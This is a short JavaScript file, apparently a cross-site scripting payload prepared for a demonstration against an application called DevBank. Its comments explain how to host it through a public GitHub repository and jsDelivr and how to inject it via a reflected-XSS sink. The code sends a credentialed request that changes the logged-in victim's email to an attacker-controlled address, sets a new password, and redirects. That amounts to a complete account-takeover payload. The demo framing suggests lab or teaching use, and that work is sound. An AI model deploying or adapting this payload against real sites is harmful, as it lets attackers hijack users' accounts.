// Upload this exact file to your own public GitHub repository, then load it via
// jsDelivr as described in DEMO-CHECKLIST.md. It runs in DevBank's origin when
// injected through the original reflected-XSS sink.
fetch("/profile", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: new URLSearchParams({
    email: "taken-over-35627921@attacker.invalid",
    password: "A2-Demo-35627921"
  })
}).then(() => {
  window.location = "/profile";
});
